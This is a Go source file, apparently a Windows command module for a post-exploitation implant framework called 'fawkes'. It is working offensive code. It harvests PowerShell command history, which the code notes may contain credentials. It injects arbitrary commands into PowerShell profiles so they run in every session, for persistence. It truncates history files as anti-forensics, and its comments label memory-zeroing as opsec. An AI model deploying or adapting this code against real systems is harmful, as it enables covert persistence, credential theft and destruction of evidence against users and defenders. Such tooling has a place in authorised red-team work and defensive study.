//go:build windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type ShellConfigCommand struct{}

func (c *ShellConfigCommand) Name() string { return "shell-config" }
func (c *ShellConfigCommand) Description() string {
	return "Read PS history, list/read/inject/remove/clear PowerShell profiles and history (T1546.013, T1552.003, T1070.003)"
}

type shellConfigArgs struct {
	Action  string `json:"action"`
	File    string `json:"file"`
	Line    string `json:"line"`
	User    string `json:"user"`
	Lines   int    `json:"lines"`
	Comment string `json:"comment"`
}

// PowerShell profile locations, in load order.
// Each entry: description, relative path from home dir, requires admin
type psProfile struct {
	Name      string
	Path      string // relative to home or absolute
	IsSystem  bool   // requires admin to write
	IsLegacy  bool   // Windows PowerShell 5.1 (vs PowerShell 7+)
	IsAbsPath bool   // if true, Path is absolute
}

func getPSProfiles() []psProfile {
	home, _ := os.UserHomeDir()
	docs := filepath.Join(home, "Documents")

	// Get PSHOME for system-wide profiles
	// PowerShell 7+: C:\Program Files\PowerShell\7
	// Windows PowerShell 5.1: C:\Windows\System32\WindowsPowerShell\v1.0
	ps7Home := `C:\Program Files\PowerShell\7`
	ps5Home := `C:\Windows\System32\WindowsPowerShell\v1.0`

	return []psProfile{
		// PowerShell 7+ profiles (load order)
		{"PS7 AllUsers AllHosts", filepath.Join(ps7Home, "Profile.ps1"), true, false, true},
		{"PS7 AllUsers CurrentHost", filepath.Join(ps7Home, "Microsoft.PowerShell_profile.ps1"), true, false, true},
		{"PS7 CurrentUser AllHosts", filepath.Join(docs, "PowerShell", "Profile.ps1"), false, false, true},
		{"PS7 CurrentUser CurrentHost", filepath.Join(docs, "PowerShell", "Microsoft.PowerShell_profile.ps1"), false, false, true},

		// Windows PowerShell 5.1 profiles (load order)
		{"PS5 AllUsers AllHosts", filepath.Join(ps5Home, "Profile.ps1"), true, true, true},
		{"PS5 AllUsers CurrentHost", filepath.Join(ps5Home, "Microsoft.PowerShell_profile.ps1"), true, true, true},
		{"PS5 CurrentUser AllHosts", filepath.Join(docs, "WindowsPowerShell", "Profile.ps1"), false, true, true},
		{"PS5 CurrentUser CurrentHost", filepath.Join(docs, "WindowsPowerShell", "Microsoft.PowerShell_profile.ps1"), false, true, true},
	}
}

func (c *ShellConfigCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Actions: history, list, read, inject, remove, clear")
	}

	var args shellConfigArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		parts := strings.Fields(task.Params)
		args.Action = parts[0]
		if len(parts) > 1 {
			args.File = parts[1]
		}
		if len(parts) > 2 {
			args.Line = strings.Join(parts[2:], " ")
		}
	}

	switch strings.ToLower(args.Action) {
	case "history":
		return psHistory(args)
	case "list":
		return psProfileList()
	case "read":
		return psProfileRead(args)
	case "inject":
		return psProfileInject(args)
	case "remove":
		return psProfileRemove(args)
	case "clear":
		return psClear(args)
	default:
		return errorf("Unknown action: %s\nAvailable: history, list, read, inject, remove, clear", args.Action)
	}
}

func psProfileList() structs.CommandResult {
	profiles := getPSProfiles()

	var sb strings.Builder
	sb.WriteString("PowerShell Profile Locations\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	for _, p := range profiles {
		exists := "[ ]"
		var sizeInfo string
		info, err := os.Stat(p.Path)
		if err == nil {
			exists = "[X]"
			sizeInfo = fmt.Sprintf(" (%d bytes)", info.Size())
		}

		adminNote := ""
		if p.IsSystem {
			adminNote = " (requires admin)"
		}

		sb.WriteString(fmt.Sprintf("  %s %s%s%s\n      %s\n", exists, p.Name, sizeInfo, adminNote, p.Path))
	}

	return successResult(sb.String())
}

func psProfileRead(args shellConfigArgs) structs.CommandResult {
	path := resolveProfilePath(args.File)
	if path == "" {
		return errorResult("Error: file parameter required. Use profile name (e.g., 'PS7 CurrentUser CurrentHost') or full path.")
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return errorf("Error reading %s: %v", path, err)
	}

	return successf("=== %s (%d bytes) ===\n%s", path, len(content), string(content))
}

func psProfileInject(args shellConfigArgs) structs.CommandResult {
	if args.Line == "" {
		return errorResult("Error: line parameter required (PowerShell command to inject)")
	}

	path := resolveProfilePath(args.File)
	if path == "" {
		// Default to CurrentUser CurrentHost (PS7) — most commonly loaded
		home, _ := os.UserHomeDir()
		path = filepath.Join(home, "Documents", "PowerShell", "Microsoft.PowerShell_profile.ps1")
	}

	line := args.Line
	if args.Comment != "" {
		line = line + " # " + args.Comment
	}

	// Read existing content
	existing, _ := os.ReadFile(path)
	defer structs.ZeroBytes(existing) // opsec: clear PowerShell profile data
	if strings.Contains(string(existing), line) {
		return successf("Line already exists in %s — skipping injection", path)
	}

	// Ensure parent directory exists
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return errorf("Error creating directory %s: %v", dir, err)
	}

	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return errorf("Error opening %s: %v", path, err)
	}
	defer f.Close()

	writeStr := line
	if len(existing) > 0 && existing[len(existing)-1] != '\n' {
		writeStr = "\n" + writeStr
	}
	writeStr = writeStr + "\n"

	if _, err := f.WriteString(writeStr); err != nil {
		return errorf("Error writing to %s: %v", path, err)
	}

	return successf("Injected into %s:\n  %s\n\nThis will execute on every PowerShell session for this user.", path, strings.TrimSpace(writeStr))
}

func psProfileRemove(args shellConfigArgs) structs.CommandResult {
	if args.Line == "" {
		return errorResult("Error: line parameter required (exact line to remove)")
	}

	path := resolveProfilePath(args.File)
	if path == "" {
		return errorResult("Error: file parameter required")
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return errorf("Error reading %s: %v", path, err)
	}
	defer structs.ZeroBytes(content) // opsec: clear PowerShell profile data

	lines := strings.Split(string(content), "\n")
	var newLines []string
	removed := 0
	for _, l := range lines {
		if strings.TrimSpace(l) == strings.TrimSpace(args.Line) ||
			strings.Contains(l, args.Line) {
			removed++
			continue
		}
		newLines = append(newLines, l)
	}

	if removed == 0 {
		return successf("Line not found in %s", path)
	}

	if err := os.WriteFile(path, []byte(strings.Join(newLines, "\n")), 0644); err != nil {
		return errorf("Error writing %s: %v", path, err)
	}

	return successf("Removed %d line(s) from %s", removed, path)
}

// getPSHistoryFiles returns paths to PowerShell command history files.
// PSReadLine stores per-host history in %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\
func getPSHistoryFiles() []string {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		home, _ := os.UserHomeDir()
		appData = filepath.Join(home, "AppData", "Roaming")
	}

	psReadLineDir := filepath.Join(appData, "Microsoft", "Windows", "PowerShell", "PSReadLine")

	// Known history file names for different PowerShell hosts
	hostFiles := []string{
		"ConsoleHost_history.txt",                   // PowerShell console (pwsh / powershell.exe)
		"Visual Studio Code Host_history.txt",       // VS Code integrated terminal
		"Windows PowerShell ISE Host_history.txt",   // ISE
		"ServerRemoteHost_history.txt",              // PSRemoting / Enter-PSSession
	}

	var paths []string
	for _, f := range hostFiles {
		paths = append(paths, filepath.Join(psReadLineDir, f))
	}
	return paths
}

// psHistory reads PowerShell command history from PSReadLine history files.
func psHistory(args shellConfigArgs) structs.CommandResult {
	maxLines := args.Lines
	if maxLines < 1 {
		maxLines = 100
	}

	var sb strings.Builder
	found := 0

	for _, path := range getPSHistoryFiles() {
		content, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		lines := strings.Split(strings.TrimRight(string(content), "\r\n"), "\n")
		structs.ZeroBytes(content) // opsec: clear history (may contain credentials in commands)
		found++

		sb.WriteString(fmt.Sprintf("=== %s (%d lines total) ===\n", path, len(lines)))

		start := 0
		if len(lines) > maxLines {
			start = len(lines) - maxLines
			sb.WriteString(fmt.Sprintf("(showing last %d lines)\n", maxLines))
		}
		for i := start; i < len(lines); i++ {
			sb.WriteString(strings.TrimRight(lines[i], "\r") + "\n")
		}
		sb.WriteString("\n")
	}

	if found == 0 {
		return successResult("No PowerShell history files found.")
	}

	return successResult(sb.String())
}

// psClear securely wipes PowerShell command history files for anti-forensics (T1070.003).
// Reads the file, zeros the memory, then truncates to zero bytes.
// If a specific file is given, only that file is cleared; otherwise all history files.
func psClear(args shellConfigArgs) structs.CommandResult {
	var targets []string
	if args.File != "" {
		path := args.File
		if !filepath.IsAbs(path) {
			// Try resolving as a profile path first
			resolved := resolveProfilePath(path)
			if resolved != "" {
				path = resolved
			}
		}
		targets = append(targets, path)
	} else {
		targets = getPSHistoryFiles()
	}

	var sb strings.Builder
	sb.WriteString("=== PowerShell History Clear ===\n\n")
	cleared := 0

	for _, path := range targets {
		info, err := os.Stat(path)
		if err != nil {
			continue // file doesn't exist
		}

		origSize := info.Size()
		if origSize == 0 {
			continue // already empty
		}

		content, err := os.ReadFile(path)
		if err != nil {
			sb.WriteString(fmt.Sprintf("  [-] %s: read error: %v\n", path, err))
			continue
		}
		structs.ZeroBytes(content) // opsec: zero history content in memory

		if err := os.Truncate(path, 0); err != nil {
			sb.WriteString(fmt.Sprintf("  [-] %s: truncate error: %v\n", path, err))
			continue
		}

		sb.WriteString(fmt.Sprintf("  [+] %s: cleared (%d bytes)\n", path, origSize))
		cleared++
	}

	if cleared == 0 {
		sb.WriteString("  No history files found or all already empty.\n")
	} else {
		sb.WriteString(fmt.Sprintf("\n  %d file(s) cleared.\n", cleared))
	}

	return successResult(sb.String())
}

// resolveProfilePath resolves a profile name or path to an absolute path.
// Accepts: profile name (e.g., "PS7 CurrentUser CurrentHost"), relative path, or absolute path.
func resolveProfilePath(file string) string {
	if file == "" {
		return ""
	}

	// If absolute path, use directly
	if filepath.IsAbs(file) {
		return file
	}

	// Try matching by profile name
	lower := strings.ToLower(file)
	for _, p := range getPSProfiles() {
		if strings.ToLower(p.Name) == lower {
			return p.Path
		}
	}

	// If it looks like a path (has separators or .ps1 extension), resolve relative to home
	if strings.Contains(file, string(filepath.Separator)) || strings.HasSuffix(file, ".ps1") {
		home, _ := os.UserHomeDir()
		return filepath.Join(home, file)
	}

	// Try as a filename in common profile directories
	home, _ := os.UserHomeDir()
	candidates := []string{
		filepath.Join(home, "Documents", "PowerShell", file),
		filepath.Join(home, "Documents", "WindowsPowerShell", file),
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}

	return file
}
